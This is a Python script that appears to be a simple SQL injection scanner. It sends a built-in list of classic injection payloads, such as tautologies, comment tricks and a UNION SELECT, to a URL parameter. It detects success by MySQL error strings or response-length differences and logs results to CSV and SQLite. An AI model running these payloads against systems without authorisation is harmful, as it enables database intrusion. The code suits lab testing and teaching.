# detector/detector.py

#!/usr/bin/env python3
"""
detector.py - simple SQL Injection detector (error-based and boolean diff)
Usage:
  python detector.py --target "http://127.0.0.1:5000/products?q="
"""
import requests
import argparse
import csv
import sqlite3
import time
from urllib.parse import quote_plus

DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' UNION SELECT 1, 2, 3, '4' --", # MySQL specific UNION (4 columns for the product table)
    "\" OR \"\" = \"\"",
    "admin' --",
    "' OR 1=1--",
    "101' OR '1'='1"
]

# Updated signatures for MySQL errors
ERROR_SIGNATURES = [
    "You have an error in your SQL syntax",
    "mysql.connector.errors",
    "Unknown column",
    "unterminated string",
    "access denied"
]

def get_baseline(target):
    r = requests.get(target + quote_plus("normalquery"))
    return r.text, len(r.text)

def attempt_payload(target, payload, baseline_text, baseline_len):
    url = target + quote_plus(payload)
    try:
        r = requests.get(url, timeout=7)
    except Exception as e:
        return {"payload":payload, "error":"timeout/exception: "+str(e), "detected":False}
    text = r.text
    length = len(text)
    detected = False
    reasons = []

    # 1) Look for DB error strings
    lowered = text.lower()
    for sig in ERROR_SIGNATURES:
        if sig.lower() in lowered:
            detected = True
            reasons.append("error-string: "+sig)
            break

    # 2) Compare content length to baseline (boolean differences)
    if not detected:
        # Check if the page contains a large number of results (typical of ' OR 1=1')
        if len(text.split('class="product"')) > 1 and baseline_len < 1000: # Heuristic for full result set
             detected = True
             reasons.append("full-result-set")
        
        # Check length difference (for less visible injections)
        elif abs(length - baseline_len) > 40:  # heuristic threshold
            detected = True
            reasons.append("length-diff: baseline={} got={}".format(baseline_len,length))

    return {"payload":payload, "status_code": r.status_code, "length": length, "detected": detected, "reasons": reasons, "url": url}

def log_to_csv(results, filename='results.csv'):
    with open(filename,'w',newline='') as f:
        w = csv.DictWriter(f, fieldnames=["payload","status_code","length","detected","reasons","url"])
        w.writeheader()
        for r in results:
            w.writerow({k:str(r.get(k,'')) for k in w.fieldnames})

def log_to_db(results, dbname='results.db'):
    # Using SQLite locally for logging the scan results
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS scans
                 (id INTEGER PRIMARY KEY, payload TEXT, status_code INT, length INT, detected INT, reasons TEXT, url TEXT, ts DATETIME)''')
    for r in results:
        c.execute('INSERT INTO scans (payload,status_code,length,detected,reasons,url,ts) VALUES (?,?,?,?,?,?,?)',
                  (r['payload'], r.get('status_code',0), r.get('length',0), int(r.get('detected',False)), ",".join(r.get('reasons',[])), r.get('url',''), time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help='Target URL prefix e.g. http://127.0.0.1:5000/products?q=')
    parser.add_argument('--payloads', help='Optional payloads file')
    args = parser.parse_args()

    target = args.target
    if args.payloads:
        with open(args.payloads) as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        payloads = DEFAULT_PAYLOADS

    baseline_text, baseline_len = get_baseline(target)
    print("Baseline length:", baseline_len)
    results = []
    for p in payloads:
        print("Testing payload:", p)
        r = attempt_payload(target, p, baseline_text, baseline_len)
        print(" -> detected:", r['detected'], r.get('reasons'))
        results.append(r)

    log_to_csv(results)
    log_to_db(results)
    print("Scan complete. Results saved to results.csv and results.db")

if __name__ == '__main__':
    main()